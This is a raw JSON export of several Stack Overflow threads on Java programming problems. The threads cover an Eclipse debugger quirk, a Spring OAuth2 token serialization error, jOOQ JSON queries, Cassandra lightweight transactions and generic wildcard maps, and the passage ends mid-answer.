Any ideas? Beforehand grateful.\r\n\r\nI have tried Throwable, Exception, RuntimeException. The result is the same. \r\n\r\nAn attempt to step over breakpoint causes NullPointerException, so, e seems really null at that moment already. Where could it be lost?\r\n\r\nEdit:\r\nI bring my gratitude to everybody and +1 to every answerer. It was an Eclipse bug. After restart Eclipse the Exception is not null anymore, it is a normal RuntimeException: Binary XML file line #15: You must supply a layout_width attribute. It would be another problem to be solved, but that one is solved.\r\n","title":"Caught Throwable or Exception is null","body":"<p>A similar question was asked here for two times and never there was any answer. Or the answer was: &quot;it is impossible!&quot; Sorry, it is possible too much:</p>\n<pre><code>try{\n    ...\n    // the line that causes the error\n    LinearLayout cell = (LinearLayout) inflater.inflate(R.layout.channels_list_cell, column);\n    ...\n}\ncatch(Throwable e){\n    Toast.makeText(this, e.toString(), Toast.LENGTH_LONG).show(); &lt; breakpoint here!\n}\n</code></pre>\n<p>At the breakpoint e is null. How can I seek for the error, please? Very possibly it is not the problem of java or Android, but of the Eclipse debugger, that itself needs debugging badly. But what have I to do, except changing to a different IDE? Any ideas? Beforehand grateful.</p>\n<p>I have tried Throwable, Exception, RuntimeException. The result is the same.</p>\n<p>An attempt to step over breakpoint causes NullPointerException, so, e seems really null at that moment already. Where could it be lost?</p>\n<p>Edit:\nI bring my gratitude to everybody and +1 to every answerer. It was an Eclipse bug. After restart Eclipse the Exception is not null anymore, it is a normal RuntimeException: Binary XML file line #15: You must supply a layout_width attribute. It would be another problem to be solved, but that one is solved.</p>\n"},{"tags":["java","spring","spring-security"],"comments":[{"owner":{"account_id":120502,"reputation":2412,"user_id":312990,"accept_rate":100,"display_name":"Nick DeFazio"},"score":0,"creation_date":1639571709,"post_id":70363381,"comment_id":124381660,"body_markdown":"How are you reproducing this error? Looking at the tutorial, is it when you are attempting to invoke your token endpoint?","body":"How are you reproducing this error? Looking at the tutorial, is it when you are attempting to invoke your token endpoint?"},{"owner":{"account_id":1241573,"reputation":69,"user_id":1204050,"display_name":"Poringe"},"score":0,"creation_date":1639572465,"post_id":70363381,"comment_id":124381991,"body_markdown":"this error popup when i try to get token\n \ni try to debugging---\n\n------ authen with oauth2 - ok\n------ authen with user admin admin1234 - ok\n------ stacktrace show error at JdbcTokenStore","body":"this error popup when i try to get token   i try to debugging---  ------ authen with oauth2 - ok ------ authen with user admin admin1234 - ok ------ stacktrace show error at JdbcTokenStore"},{"owner":{"account_id":1241573,"reputation":69,"user_id":1204050,"display_name":"Poringe"},"score":0,"creation_date":1639573001,"post_id":70363381,"comment_id":124382192,"body_markdown":"fyi try inMemory() work fine\n---------------------------\nclients.inMemory()\n        .withClient(&quot;spring-security-oauth2-read-write-client&quot;)\n        .secret(&quot;$2a$04$soeOR.QFmClXeFIrhJVLWOQxfHjsJLSpWrU1iGxcMGdu.a5hvfY4W&quot;)\n        .scopes(&quot;read-write&quot;)\n        .authorizedGrantTypes(&quot;password&quot;);","body":"fyi try inMemory() work fine --------------------------- clients.inMemory()         .withClient(&quot;spring-security-oauth2-read-write-client&quot;)         .secret(&quot;$2a$04$soeOR.QFmClXeFIrhJVLWOQxfHjsJLSpWrU1iGxcMGdu&zwnj;&#8203;.a5hvfY4W&quot;)         .scopes(&quot;read-write&quot;)         .authorizedGrantTypes(&quot;password&quot;);"}],"owner":{"account_id":1241573,"reputation":69,"user_id":1204050,"display_name":"Poringe"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":202,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1639569812,"creation_date":1639569812,"question_id":70363381,"body_markdown":"im try to follow this tutorial : https://adamzareba.github.io/Secure-Spring-REST-With-Spring-Security-and-OAuth2/\r\n\r\nEverything work fine until create/store token\r\n\r\ndont know what wrong with org.springframework.data.projection.DefaultMethodInvokingMethodInterceptor\r\n\r\nSpring boot : Java 8 : Mysql\r\n\r\nStacktrace..\r\n\r\n``` 2021-12-15 18:41:09.005  INFO 18284 --- [nio-8888-exec-1] o.s.s.o.p.token.store.JdbcTokenStore     : Failed to find access token\r\n2021-12-15 18:41:09.045 ERROR 18284 --- [nio-8888-exec-1] o.s.s.o.provider.endpoint.TokenEndpoint  : Handling error: IllegalArgumentException, java.io.NotSerializableException: org.springframework.data.projection.DefaultMethodInvokingMethodInterceptor\r\n\r\njava.lang.IllegalArgumentException: java.io.NotSerializableException: org.springframework.data.projection.DefaultMethodInvokingMethodInterceptor\r\n\tat org.springframework.security.oauth2.common.util.SerializationUtils.serialize(SerializationUtils.java:23) ~[spring-security-oauth2-2.3.8.RELEASE.jar:na]\r\n\tat org.springframework.security.oauth2.provider.token.store.JdbcTokenStore.serializeAuthentication(JdbcTokenStore.java:393) ~[spring-security-oauth2-2.3.8.RELEASE.jar:na]\r\n\tat org.springframework.security.oauth2.provider.token.store.JdbcTokenStore.storeAccessToken(JdbcTokenStore.java:152) ~[spring-security-oauth2-2.3.8.RELEASE.jar:na]\r\n\tat org.springframework.security.oauth2.provider.token.DefaultTokenServices.createAccessToken(DefaultTokenServices.java:122) ~[spring-security-oauth2-2.3.8.RELEASE.jar:na]\r\n\tat org.springframework.security.oauth2.provider.token.AbstractTokenGranter.getAccessToken(AbstractTokenGranter.java:72) ~[spring-security-oauth2-2.3.8.RELEASE.jar:na]\r\n\tat org.springframework.security.oauth2.provider.token.AbstractTokenGranter.grant(AbstractTokenGranter.java:67) ~[spring-security-oauth2-2.3.8.RELEASE.jar:na]\r\n\tat org.springframework.security.oauth2.provider.CompositeTokenGranter.grant(CompositeTokenGranter.java:38) ~[spring-security-oauth2-2.3.8.RELEASE.jar:na]\r\n\tat org.springframework.security.oauth2.config.annotation.web.configurers.AuthorizationServerEndpointsConfigurer$4.grant(AuthorizationServerEndpointsConfigurer.java:583) ~[spring-security-oauth2-2.3.8.RELEASE.jar:na]\r\n\tat org.springframework.security.oauth2.provider.endpoint.TokenEndpoint.postAccessToken(TokenEndpoint.java:132) ~[spring-security-oauth2-2.3.8.RELEASE.jar:na]\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na]\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77) ~[na:na]\r\n\tat java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na]\r\n\tat java.base/java.lang.reflect.Method.invoke(Method.java:568) ~[na:na]\r\n\tat org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) ~[spring-web-5.2.15.RELEASE.jar:5.2.15.RELEASE]\r\n\tat org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) ~[spring-web-5.2.15.RELEASE.jar:5.2.15.RELEASE]\r\n\tat org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:105) ~[spring-webmvc-5.2.15.RELEASE.jar:5.2.15.RELEASE]\r\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:878) ~[spring-webmvc-5.2.15.RELEASE.jar:5.2.15.RELEASE]\r\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:792) ~[spring-webmvc-5.2.15.RELEASE.jar:5.2.15.RELEASE]\r\n\tat org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.2.15.RELEASE.jar:5.2.15.RELEASE]\r\n\t","title":"Spring Security Oauth2 - java.io.NotSerializableException: org.springframework.data.projection.DefaultMethodInvokingMethodInterceptor","body":"<p>im try to follow this tutorial : <a href=\"https://adamzareba.github.io/Secure-Spring-REST-With-Spring-Security-and-OAuth2/\" rel=\"nofollow noreferrer\">https://adamzareba.github.io/Secure-Spring-REST-With-Spring-Security-and-OAuth2/</a></p>\n<p>Everything work fine until create/store token</p>\n<p>dont know what wrong with org.springframework.data.projection.DefaultMethodInvokingMethodInterceptor</p>\n<p>Spring boot : Java 8 : Mysql</p>\n<p>Stacktrace..</p>\n<pre><code>2021-12-15 18:41:09.045 ERROR 18284 --- [nio-8888-exec-1] o.s.s.o.provider.endpoint.TokenEndpoint  : Handling error: IllegalArgumentException, java.io.NotSerializableException: org.springframework.data.projection.DefaultMethodInvokingMethodInterceptor\n\njava.lang.IllegalArgumentException: java.io.NotSerializableException: org.springframework.data.projection.DefaultMethodInvokingMethodInterceptor\n    at org.springframework.security.oauth2.common.util.SerializationUtils.serialize(SerializationUtils.java:23) ~[spring-security-oauth2-2.3.8.RELEASE.jar:na]\n    at org.springframework.security.oauth2.provider.token.store.JdbcTokenStore.serializeAuthentication(JdbcTokenStore.java:393) ~[spring-security-oauth2-2.3.8.RELEASE.jar:na]\n    at org.springframework.security.oauth2.provider.token.store.JdbcTokenStore.storeAccessToken(JdbcTokenStore.java:152) ~[spring-security-oauth2-2.3.8.RELEASE.jar:na]\n    at org.springframework.security.oauth2.provider.token.DefaultTokenServices.createAccessToken(DefaultTokenServices.java:122) ~[spring-security-oauth2-2.3.8.RELEASE.jar:na]\n    at org.springframework.security.oauth2.provider.token.AbstractTokenGranter.getAccessToken(AbstractTokenGranter.java:72) ~[spring-security-oauth2-2.3.8.RELEASE.jar:na]\n    at org.springframework.security.oauth2.provider.token.AbstractTokenGranter.grant(AbstractTokenGranter.java:67) ~[spring-security-oauth2-2.3.8.RELEASE.jar:na]\n    at org.springframework.security.oauth2.provider.CompositeTokenGranter.grant(CompositeTokenGranter.java:38) ~[spring-security-oauth2-2.3.8.RELEASE.jar:na]\n    at org.springframework.security.oauth2.config.annotation.web.configurers.AuthorizationServerEndpointsConfigurer$4.grant(AuthorizationServerEndpointsConfigurer.java:583) ~[spring-security-oauth2-2.3.8.RELEASE.jar:na]\n    at org.springframework.security.oauth2.provider.endpoint.TokenEndpoint.postAccessToken(TokenEndpoint.java:132) ~[spring-security-oauth2-2.3.8.RELEASE.jar:na]\n    at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na]\n    at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77) ~[na:na]\n    at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na]\n    at java.base/java.lang.reflect.Method.invoke(Method.java:568) ~[na:na]\n    at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) ~[spring-web-5.2.15.RELEASE.jar:5.2.15.RELEASE]\n    at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) ~[spring-web-5.2.15.RELEASE.jar:5.2.15.RELEASE]\n    at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:105) ~[spring-webmvc-5.2.15.RELEASE.jar:5.2.15.RELEASE]\n    at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:878) ~[spring-webmvc-5.2.15.RELEASE.jar:5.2.15.RELEASE]\n    at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:792) ~[spring-webmvc-5.2.15.RELEASE.jar:5.2.15.RELEASE]\n    at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.2.15.RELEASE.jar:5.2.15.RELEASE]\n    \n</code></pre>\n"},{"tags":["java","sql","jooq"],"answers":[{"tags":[],"owner":{"account_id":247217,"reputation":213455,"user_id":521799,"accept_rate":89,"display_name":"Lukas Eder"},"down_vote_count":0,"up_vote_count":2,"is_accepted":true,"score":2,"last_activity_date":1639569667,"creation_date":1638792366,"answer_id":70245236,"question_id":70241320,"body_markdown":"You can use the built-in [`JSON_VALUE()`][1] support of jOOQ:\r\n\r\n```java\r\nctx.selectFrom(EMPLOYEE)\r\n   .where(cast(jsonValue(EMPLOYEE.ADDRESS, &quot;$.city&quot;), VARCHAR).eq(&quot;\\&quot;Mumbai\\&quot;&quot;))\r\n   .fetch();\r\n```\r\n\r\nThis is assuming you use code generation and have the usual static imports:\r\n\r\n```java\r\nimport static org.jooq.impl.DSL.*;\r\nimport static org.jooq.impl.SQLDataType.*;\r\n```\r\n\r\nIf you need support for any other vendor-specific JSON function that jOOQ doesn&#39;t support (yet), use plain SQL templating instead.\r\n\r\nHowever, that approach is unlikely to take advantage of indexes, so if you can, I suggest normalising this data.\r\n\r\n  [1]: https://www.jooq.org/doc/latest/manual/sql-building/column-expressions/json-functions/json-value-function/","title":"How to retrieve data from database using jOOQ based on jsontype properties","body":"<p>You can use the built-in <a href=\"https://www.jooq.org/doc/latest/manual/sql-building/column-expressions/json-functions/json-value-function/\" rel=\"nofollow noreferrer\"><code>JSON_VALUE()</code></a> support of jOOQ:</p>\n<pre class=\"lang-java prettyprint-override\"><code>ctx.selectFrom(EMPLOYEE)\n   .where(cast(jsonValue(EMPLOYEE.ADDRESS, &quot;$.city&quot;), VARCHAR).eq(&quot;\\&quot;Mumbai\\&quot;&quot;))\n   .fetch();\n</code></pre>\n<p>This is assuming you use code generation and have the usual static imports:</p>\n<pre class=\"lang-java prettyprint-override\"><code>import static org.jooq.impl.DSL.*;\nimport static org.jooq.impl.SQLDataType.*;\n</code></pre>\n<p>If you need support for any other vendor-specific JSON function that jOOQ doesn't support (yet), use plain SQL templating instead.</p>\n<p>However, that approach is unlikely to take advantage of indexes, so if you can, I suggest normalising this data.</p>\n"}],"owner":{"account_id":22549881,"reputation":103,"user_id":16739133,"display_name":"Prashanth Billa"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":514,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"accepted_answer_id":70245236,"answer_count":1,"score":2,"last_activity_date":1639569667,"creation_date":1638769388,"question_id":70241320,"body_markdown":"we have a Employee table with json type address column like mentioned below\r\n\r\n**Employee Table:**\r\n\r\n\r\n[![enter image description here][1]][1]\r\n\r\n  [1]: https://i.stack.imgur.com/Enc9f.png\r\n\r\nHow to retrieve the Employee details based on city name which is in address column using jOOQ?\r\n","title":"How to retrieve data from database using jOOQ based on jsontype properties","body":"<p>we have a Employee table with json type address column like mentioned below</p>\n<p><strong>Employee Table:</strong></p>\n<p><a href=\"https://i.stack.imgur.com/Enc9f.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/Enc9f.png\" alt=\"enter image description here\" /></a></p>\n<p>How to retrieve the Employee details based on city name which is in address column using jOOQ?</p>\n"},{"tags":["java","android","android-studio","search-engine"],"answers":[{"tags":[],"owner":{"account_id":5532720,"reputation":190,"user_id":4392195,"accept_rate":67,"display_name":"sausagerus"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639567833,"creation_date":1463346513,"answer_id":37243697,"question_id":37242401,"body_markdown":"initialize in your activity edittext for me is it address_search_view \r\n\r\n    addresses_search_view.addTextChangedListener(new TextWatcher() {\r\n       @Override\r\n       public void onTextChanged(CharSequence s, int start, int before, int count) {\r\n       Addresses.this.addressesSAdapter.getFilter().filter(s);}\r\n       @Override\r\n       public void beforeTextChanged(CharSequence s, int start, int count, int after) {\r\n       }\r\n       @Override\r\n       public void afterTextChanged(Editable s) {\r\n       }\r\n    });\r\n\r\n                                                            ","title":"How to add a search engine feature in an Android application?","body":"<p>initialize in your activity edittext for me is it address_search_view</p>\n<pre><code>addresses_search_view.addTextChangedListener(new TextWatcher() {\n   @Override\n   public void onTextChanged(CharSequence s, int start, int before, int count) {\n   Addresses.this.addressesSAdapter.getFilter().filter(s);}\n   @Override\n   public void beforeTextChanged(CharSequence s, int start, int count, int after) {\n   }\n   @Override\n   public void afterTextChanged(Editable s) {\n   }\n});\n\n                                                        \n</code></pre>\n"}],"owner":{"account_id":7641145,"reputation":33,"user_id":5793169,"accept_rate":25,"display_name":"RajaRaman"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":2000,"favorite_count":0,"down_vote_count":4,"up_vote_count":0,"answer_count":1,"score":-4,"last_activity_date":1639569643,"creation_date":1463338508,"question_id":37242401,"body_markdown":"I need to create a search engine feature for my application. It should search particular websites. Is there any way to develop this in Android. **[![api][1]][1]**\r\n\r\n\r\n  [1]: http://i.stack.imgur.com/Y95KU.png\r\n\r\n\r\nI need to add this as a feature in my Android application.","title":"How to add a search engine feature in an Android application?","body":"<p>I need to create a search engine feature for my application. It should search particular websites. Is there any way to develop this in Android. <strong><a href=\"https://i.stack.imgur.com/Y95KU.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/Y95KU.png\" alt=\"api\" /></a></strong></p>\n<p>I need to add this as a feature in my Android application.</p>\n"},{"tags":["java","spring","spring-webclient","json-view"],"comments":[{"owner":{"account_id":14301063,"reputation":754,"user_id":10330374,"display_name":"Nick"},"score":0,"creation_date":1639572472,"post_id":70363254,"comment_id":124381994,"body_markdown":"I think it is not possible as you would need to get access to objectWriter from objectMapper at the time of deserialization in webClient","body":"I think it is not possible as you would need to get access to objectWriter from objectMapper at the time of deserialization in webClient"},{"owner":{"account_id":4368701,"reputation":397,"user_id":3563655,"accept_rate":62,"display_name":"Rick"},"score":0,"creation_date":1639573549,"post_id":70363254,"comment_id":124382440,"body_markdown":"Thanks @Nick. That would explain why I&#39;ve not seen anything about using them together (despite it being such an obvious usecase).","body":"Thanks @Nick. That would explain why I&#39;ve not seen anything about using them together (despite it being such an obvious usecase)."},{"owner":{"account_id":14301063,"reputation":754,"user_id":10330374,"display_name":"Nick"},"score":0,"creation_date":1639575879,"post_id":70363254,"comment_id":124383472,"body_markdown":"you can try adding mixIns to objectMapper instead of working with views, it is also an option to add/ignore fields in mapping. See [link](https://www.baeldung.com/jackson-annotations#jackson-mixin-annotations)","body":"you can try adding mixIns to objectMapper instead of working with views, it is also an option to add/ignore fields in mapping. See <a href=\"https://www.baeldung.com/jackson-annotations#jackson-mixin-annotations\" rel=\"nofollow noreferrer\">link</a>"},{"owner":{"account_id":4368701,"reputation":397,"user_id":3563655,"accept_rate":62,"display_name":"Rick"},"score":0,"creation_date":1639609489,"post_id":70363254,"comment_id":124395952,"body_markdown":"Interesting theory, @Nick. Except that example shows how to exclude properties that are of a specific class. As I want to exclude one instance of `String` amongst several, that won&#39;t work either.","body":"Interesting theory, @Nick. Except that example shows how to exclude properties that are of a specific class. As I want to exclude one instance of <code>String</code> amongst several, that won&#39;t work either."}],"owner":{"account_id":4368701,"reputation":397,"user_id":3563655,"accept_rate":62,"display_name":"Rick"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":342,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1639569241,"creation_date":1639569241,"question_id":70363254,"body_markdown":"I have dived into the documentation, but only find circular references to the mechanical aspects of the use of `webCleint`, without any concrete examples… And nothing that merges it with the use of `@JsonView`.\r\n\r\nI have a microservice that accepts a DTO from the client, performs basic validation, then wants to pass it on to another microservice. But, in passing it on, I want to strip out fields, per a JsonView.\r\n\r\n**Basic User DTO**\r\n```\r\n\t@JsonView({Views.Incoming.class,Views.Internal.class})\r\n\tprivate String email;\r\n\t@JsonView({Views.Incoming.class,Views.Internal.class})\r\n\tprivate String password;\r\n\t@JsonView(Views.Incoming.class)\r\n\tprivate String passwordCheck  //validated as matching in first service, not needed when handed off.\r\n```\r\n\r\nHow do I a) actually build a `webClient`, make a request with it, and return a usable result, and b) give it my DTO filtered by `@JsonView(Views.Internal.class)`?\r\n\r\n(The documentation about `webClient` itself is confusing, in that it suggests that a separate one is needed for each request (differentiating it from `restTemplate`), but the examples I have found instantiate one as static in the sercive class…)","title":"How do I call an API using (Spring) webClient with a @JsonView-filtered DTO?","body":"<p>I have dived into the documentation, but only find circular references to the mechanical aspects of the use of <code>webCleint</code>, without any concrete examples… And nothing that merges it with the use of <code>@JsonView</code>.</p>\n<p>I have a microservice that accepts a DTO from the client, performs basic validation, then wants to pass it on to another microservice. But, in passing it on, I want to strip out fields, per a JsonView.</p>\n<p><strong>Basic User DTO</strong></p>\n<pre><code>    @JsonView({Views.Incoming.class,Views.Internal.class})\n    private String email;\n    @JsonView({Views.Incoming.class,Views.Internal.class})\n    private String password;\n    @JsonView(Views.Incoming.class)\n    private String passwordCheck  //validated as matching in first service, not needed when handed off.\n</code></pre>\n<p>How do I a) actually build a <code>webClient</code>, make a request with it, and return a usable result, and b) give it my DTO filtered by <code>@JsonView(Views.Internal.class)</code>?</p>\n<p>(The documentation about <code>webClient</code> itself is confusing, in that it suggests that a separate one is needed for each request (differentiating it from <code>restTemplate</code>), but the examples I have found instantiate one as static in the sercive class…)</p>\n"},{"tags":["java","concurrency","cassandra","microservices","azure-cosmosdb"],"comments":[{"owner":{"account_id":5994994,"reputation":19189,"user_id":5641244,"display_name":"Levi Ramsey"},"score":2,"creation_date":1639507484,"post_id":70351829,"comment_id":124364774,"body_markdown":"You&#39;re using Cosmos, so it&#39;s worth noting that LWT isn&#39;t fully supported in Cosmos (e.g. single-region only).","body":"You&#39;re using Cosmos, so it&#39;s worth noting that LWT isn&#39;t fully supported in Cosmos (e.g. single-region only)."}],"answers":[{"tags":[],"owner":{"account_id":5994994,"reputation":19189,"user_id":5641244,"display_name":"Levi Ramsey"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1639569102,"creation_date":1639569102,"answer_id":70363226,"question_id":70351829,"body_markdown":"Note that LWT doesn&#39;t affect `SELECT`s.  The usual last-writer-wins and tunable consistency semantics apply (though running a `SELECT` with consistency level `ALL` guarantees that you&#39;ll see the write from the latest `INSERT`/`UPDATE` (which in Cassandra should best be considered the same: `INSERT` has upsert semantics)).\r\n\r\nYou can use `LWT`s to ensure that no two users share a `gift_id`.  Simply `INSERT` with `IF NOT EXISTS` if once a gift is associated with a user it can&#39;t be associated with any other user.  Alternatively, you can do a `SELECT user_id FROM gifts WHERE gift_id = ...` and then `INSERT` with `IF user_id = the_user_id_from_the_select`.","title":"Cassandra - Distributed Row Locking for Select AND Update","body":"<p>Note that LWT doesn't affect <code>SELECT</code>s.  The usual last-writer-wins and tunable consistency semantics apply (though running a <code>SELECT</code> with consistency level <code>ALL</code> guarantees that you'll see the write from the latest <code>INSERT</code>/<code>UPDATE</code> (which in Cassandra should best be considered the same: <code>INSERT</code> has upsert semantics)).</p>\n<p>You can use <code>LWT</code>s to ensure that no two users share a <code>gift_id</code>.  Simply <code>INSERT</code> with <code>IF NOT EXISTS</code> if once a gift is associated with a user it can't be associated with any other user.  Alternatively, you can do a <code>SELECT user_id FROM gifts WHERE gift_id = ...</code> and then <code>INSERT</code> with <code>IF user_id = the_user_id_from_the_select</code>.</p>\n"}],"owner":{"account_id":23646006,"reputation":31,"user_id":17675634,"display_name":"Ramit Kovvalpurail"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":228,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"answer_count":1,"score":2,"last_activity_date":1639569102,"creation_date":1639497415,"question_id":70351829,"body_markdown":"I have a micro-service which runs on multiple machines in two regions which connects to Cassandra DB. I have the following table structure.\r\n\r\n    CREATE TABLE gifts (\r\n      gift_id text,\r\n      user_id text\r\n      PRIMARY KEY gift_id\r\n    );\r\n\r\nThe table contains a list of gift id. \r\n\r\nDuring multiple concurrent request each user must be assigned a unique gift i.e select a random gift_id and update the user_id.\r\n\r\nWill LWT be helpful to solve this problem?\r\n\r\n**Limitations:**\r\n- Cannot use zookeeper for locking\r\n- Cannot use any relational database.","title":"Cassandra - Distributed Row Locking for Select AND Update","body":"<p>I have a micro-service which runs on multiple machines in two regions which connects to Cassandra DB. I have the following table structure.</p>\n<pre><code>CREATE TABLE gifts (\n  gift_id text,\n  user_id text\n  PRIMARY KEY gift_id\n);\n</code></pre>\n<p>The table contains a list of gift id.</p>\n<p>During multiple concurrent request each user must be assigned a unique gift i.e select a random gift_id and update the user_id.</p>\n<p>Will LWT be helpful to solve this problem?</p>\n<p><strong>Limitations:</strong></p>\n<ul>\n<li>Cannot use zookeeper for locking</li>\n<li>Cannot use any relational database.</li>\n</ul>\n"},{"tags":["java","generics"],"comments":[{"owner":{"account_id":15064163,"reputation":13519,"user_id":10871900,"display_name":"dan1st is crying"},"score":0,"creation_date":1639548564,"post_id":70359061,"comment_id":124373904,"body_markdown":"Why do you need a `Map&lt;String, ? extends Map&lt;String, Integer&gt;&gt;` and not a `Map&lt;String, Map&lt;String, Integer&gt;&gt;` anyways?","body":"Why do you need a <code>Map&lt;String, ? extends Map&lt;String, Integer&gt;&gt;</code> and not a <code>Map&lt;String, Map&lt;String, Integer&gt;&gt;</code> anyways?"},{"owner":{"account_id":16944613,"reputation":418,"user_id":12255620,"display_name":"MBobrik"},"score":0,"creation_date":1639548668,"post_id":70359061,"comment_id":124373921,"body_markdown":"It&#39;s a function parameter and it is called with `TreeMap&lt;String,TreeMap&lt;String,Integer&gt;&gt;`","body":"It&#39;s a function parameter and it is called with <code>TreeMap&lt;String,TreeMap&lt;String,Integer&gt;&gt;</code>"},{"owner":{"account_id":15064163,"reputation":13519,"user_id":10871900,"display_name":"dan1st is crying"},"score":0,"creation_date":1639548699,"post_id":70359061,"comment_id":124373931,"body_markdown":"I know what it is but why do you need it? Why can&#39;t you use a `Map&lt;String, Map&lt;String, Integer&gt;&gt;` and fill it with `TreeMap`s?","body":"I know what it is but why do you need it? Why can&#39;t you use a <code>Map&lt;String, Map&lt;String, Integer&gt;&gt;</code> and fill it with <code>TreeMap</code>s?"},{"owner":{"account_id":16944613,"reputation":418,"user_id":12255620,"display_name":"MBobrik"},"score":0,"creation_date":1639548763,"post_id":70359061,"comment_id":124373953,"body_markdown":"the `TreeMap&lt;String,TreeMap&lt;String,Integer&gt;&gt;` ? All of the other code needs a TreeMap.","body":"the <code>TreeMap&lt;String,TreeMap&lt;String,Integer&gt;&gt;</code> ? All of the other code needs a TreeMap."},{"owner":{"account_id":1691630,"reputation":49583,"user_id":1553851,"accept_rate":73,"display_name":"shmosel"},"score":0,"creation_date":1639553609,"post_id":70359061,"comment_id":124375143,"body_markdown":"Related: https://stackoverflow.com/q/2800369/1553851","body":"Related: <a href=\"https://stackoverflow.com/q/2800369/1553851\">stackoverflow.com/q/2800369/1553851</a>"}],"answers":[{"tags":[],"owner":{"account_id":16944613,"reputation":418,"user_id":12255620,"display_name":"MBobrik"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639563399,"creation_date":1639563399,"answer_id":70361923,"question_id":70359061,"body_markdown":"&lt;!-- language-all: lang-java --&gt;\r\nOne possible, but still rather clunky, solution is a helper function:\r\n```\r\nstatic &lt;K1, K2, V, M extends Map&lt;K2, V&gt;&gt; Map&lt;K2, V&gt; getOrEmpty(Map&lt;K1, M&gt; mapOfMaps, K1 key) {\r\n  Map&lt;K2, V&gt; submap = mapOfMaps.get(key);\r\n  return submap != null ? submap : Collections.emptyMap();\r\n}\r\n```\r\n\r\nand then call it like\r\n```\r\nMap&lt;String, Integer&gt; result = getOrEmpty(mapOfMaps,&quot;aaa&quot;);\r\n```\r\n----------\r\n\r\nBut I would still prefer a solution without having to define an extra function.\r\n\r\n","title":"Java Map.getOrDefault with bounded wildcard","body":"\n<p>One possible, but still rather clunky, solution is a helper function:</p>\n<pre class=\"lang-java prettyprint-override\"><code>static &lt;K1, K2, V, M extends Map&lt;K2, V&gt;&gt; Map&lt;K2, V&gt; getOrEmpty(Map&lt;K1, M&gt; mapOfMaps, K1 key) {\n  Map&lt;K2, V&gt; submap = mapOfMaps.get(key);\n  return submap != null ? submap : Collections.emptyMap();\n}\n</code></pre>\n<p>and then call it like</p>\n<pre class=\"lang-java prettyprint-override\"><code>Map&lt;String, Integer&gt; result = getOrEmpty(mapOfMaps,&quot;aaa&quot;);\n</code></pre>\n<hr />\n<p>But I would still prefer a solution without having to define an extra function.</p>\n"},{"tags":[],"owner":{"account_id":10192070,"reputation":2256,"user_id":7525132,"display_name":"Izruo"},"down_vote_count":0,"up_vote_count":4,"is_accepted":true,"score":4,"last_activity_date":1639568920,"creation_date":1639564940,"answer_id":70362275,"question_id":70359061,"body_markdown":"You can use [`Collections.unmodifiableMap`](https://docs.oracle.com/javase/8/docs/api/java/util/Collections.html#unmodifiableMap-java.util.Map-) to view your map as `Map&lt;String, Map&lt;String, Integer&gt;&gt;`.\r\n\r\n    Map&lt;String, ? extends Map&lt;String, Integer&gt;&gt; mapOfMaps = new HashMap&lt;&gt;();\r\n    Map&lt;String, Map&lt;String, Integer&gt;&gt; view = Collections.unmodifiableMap(mapOfMaps);\r\n    Map&lt;String, Integer&gt; map = view.getOrDefault(&quot;foo&quot;, Collections.emptyMap());\r\n\r\nIn a single line, however, it still looks ugly, since you need to specify the generic type arguments for `unmodifiableMap`.\r\n\r\n    Map&lt;String, Integer&gt; map = Collections.&lt;String, Map&lt;String, Integer&gt;&gt;\r\n        unmodifiableMap(mapOfMaps).getOrDefault(&quot;foo&quot;, Collections.emptyMap());\r\n\r\n### Explanation ###\r\n\r\nYou cannot call any method that has an unbounded or `extends`-bounded wildcard parameter, because the exact type of the wildcard is not known at compile 